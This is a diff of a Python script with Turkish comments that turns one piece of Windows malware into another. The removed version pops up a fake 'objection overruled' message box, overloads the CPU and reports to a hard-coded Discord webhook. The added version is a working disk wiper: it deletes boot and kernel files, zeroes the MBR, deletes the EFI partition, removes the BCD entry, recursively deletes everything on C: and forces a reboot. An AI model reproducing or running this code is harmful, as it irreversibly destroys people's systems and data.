@@ -1,94 +1,83 @@
-import ctypes
-import time
-import multiprocessing
-import sys
-import threading
 import os
-import requests
+import subprocess
+import shutil
 
 # ==========================================
-# WEBHOOK BİLDİRİM URL'SI
+# 1. KRİTİK SİSTEM DOSYALARINI SİL
 # ==========================================
-WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo7IXkkVpa5gfHkfqHTnXCuRE3Iwp_D3GyJiFnivKfv0o5Z1R1xbF7PEUi"
+def delete_system_files():
+    files = [
+        "C:\\bootmgr",
+        "C:\\Boot\\BCD",
+        "C:\\Windows\\System32\\winload.exe",
+        "C:\\Windows\\System32\\winload.efi",
+        "C:\\Windows\\System32\\winlogon.exe",
+        "C:\\Windows\\System32\\hal.dll",
+        "C:\\Windows\\System32\\ntoskrnl.exe",
+        "C:\\Windows\\System32\\ntdll.dll"
+    ]
+    for f in files:
+        try:
+            if os.path.exists(f):
+                os.remove(f)
+                print(f"[+] Silindi: {f}")
+        except Exception as e:
+            print(f"[-] Silinemedi: {f} - {e}")
 
-def send_notification(message):
+# ==========================================
+# 2. MBR (MASTER BOOT RECORD) SİL
+# ==========================================
+def wipe_mbr():
     try:
-        payload = {"content": f"**[CPU BİLDİRİM]** {message}"}
-        requests.post(WEBHOOK_URL, json=payload, timeout=5)
-    except:
-        pass
-
-# ==========================================
-# FLAG DOSYASI (DANDİK İSİM)
-# ==========================================
-FLAG_FILE = "C:\\Windows\\Temp\\fgjhfgkfsjg.flag"
-
-# ==========================================
-# 1. SAHTE PENCERE (SADECE FLAG YOKSA)
-# ==========================================
-def show_fake_window():
-    if os.path.exists(FLAG_FILE):
-        send_notification("⏭️ Flag dosyası bulundu, pencere açılmayacak.")
-        return
-    
-    send_notification("🪟 Sahte pencere açılıyor...")
-    result = ctypes.windll.user32.MessageBoxW(
-        0,
-        "Although the ticket referenced by 'Yeoizii' was reviewed under better and fewer rules, no login from any other location could be found on the account. Since it was made from the person's own computer, the arrows point to this fact. The request has been denied!",
-        "Your objection has been overruled!",
-        0x10 | 0x1
-    )
-    send_notification("✅ Sahte pencere kapatıldı.")
-    return result
-
-# ==========================================
-# 2. İŞLEMCİYİ ZORLA (4 KATI)
-# ==========================================
-def cpu_killer():
-    while True:
-        x = 3.14159
-        for _ in range(1000000):
-            x = x ** 1.00001
-            x = x / 1.000001
-        arr = [i ** i for i in range(5000)]
-        for _ in range(100):
-            arr.sort()
-            arr.reverse()
-
-def start_cpu_killer():
-    core_count = multiprocessing.cpu_count()
-    thread_count = core_count * 4
-    send_notification(f"🧠 Çekirdek: {core_count}, Açılacak thread: {thread_count}")
-    
-    for _ in range(thread_count):
-        threading.Thread(target=cpu_killer, daemon=True).start()
-    
-    send_notification(f"🔥 CPU %100 yüklendi ({thread_count} thread ile)")
-
-# ==========================================
-# 3. FLAG OLUŞTUR
-# ==========================================
-def create_flag():
-    try:
-        with open(FLAG_FILE, "w") as f:
-            f.write("EXECUTED")
-        send_notification(f"✅ Flag oluşturuldu: {FLAG_FILE}")
+        with open("\\\\.\\PhysicalDrive0", "wb") as f:
+            f.write(b'\x00' * 512)
+        print("[+] MBR silindi!")
     except Exception as e:
-        send_notification(f"❌ Flag oluşturulamadı: {e}")
+        print(f"[-] MBR silinemedi: {e}")
 
 # ==========================================
-# 4. ANA
+# 3. EFI PARTİSYON SİL
+# ==========================================
+def delete_efi():
+    try:
+        subprocess.run('diskpart /c "select disk 0" /c "select partition 1" /c "delete partition override"', shell=True)
+        print("[+] EFI partition silindi!")
+    except Exception as e:
+        print(f"[-] EFI silinemedi: {e}")
+
+# ==========================================
+# 4. BCD SİL
+# ==========================================
+def delete_bcd():
+    try:
+        subprocess.run('bcdedit /delete {default} /f', shell=True, capture_output=True)
+        print("[+] BCD silindi!")
+    except Exception as e:
+        print(f"[-] BCD silinemedi: {e}")
+
+# ==========================================
+# 5. TÜM DOSYALARI SİL (DISK)
+# ==========================================
+def wipe_disk():
+    try:
+        os.system('del /f /s /q C:\\* >nul 2>&1')
+        print("[+] Tüm dosyalar silindi!")
+    except Exception as e:
+        print(f"[-] Disk silinemedi: {e}")
+
+# ==========================================
+# 6. HEP BİRLİKTE ÇALIŞTIR
 # ==========================================
 if __name__ == "__main__":
-    send_notification("🚀 CPU ZORLAMA BAŞLATILDI!")
+    print("[*] Sistem silme işlemi başlatıldı...")
     
-    show_fake_window()
-    create_flag()
+    delete_system_files()
+    wipe_mbr()
+    delete_efi()
+    delete_bcd()
+    wipe_disk()
     
-    send_notification("⏳ 10 saniye bekleniyor...")
-    time.sleep(10)
+    print("[+] Sistem tamamen bozuldu!")
     
-    start_cpu_killer()
-    
-    while True:
-        time.sleep(60)
+    # Bilgisayarı yeniden başlat
+    os.system("shutdown /r /t 0")
